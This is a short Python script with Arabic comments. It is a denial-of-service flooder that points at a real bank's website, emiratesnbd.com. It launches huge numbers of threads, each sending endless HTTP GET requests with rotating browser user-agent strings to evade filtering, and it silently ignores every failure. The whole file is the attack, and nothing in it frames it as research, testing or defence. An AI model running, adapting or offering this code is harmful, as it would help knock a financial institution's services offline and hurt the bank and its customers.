import requests
import threading
import time
import random

# إعدادات الاتصالات
connections_per_thread = 10000000000
num_threads = 100000000000000
url = "https://www.emiratesnbd.com/lol"
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

base_headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Cache-Control": "no-cache",
}

def send_requests():
    local_session = requests.Session()  # استخدام جلسة محلية لكل خيط
    while True:
        for _ in range(connections_per_thread):
            try:
                headers = base_headers.copy()
                headers["User-Agent"] = random.choice(user_agents)
                local_session.get(url, headers=headers, timeout=5)
            except requests.exceptions.RequestException:
                pass
        time.sleep(0.1)  # تقليل الضغط على النظام

threads = []

# إنشاء الخيوط
for _ in range(num_threads):
    thread = threading.Thread(target=send_requests, daemon=True)
    threads.append(thread)
    thread.start()

# الحفاظ على تشغيل الكود
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("تم الإيقاف.")
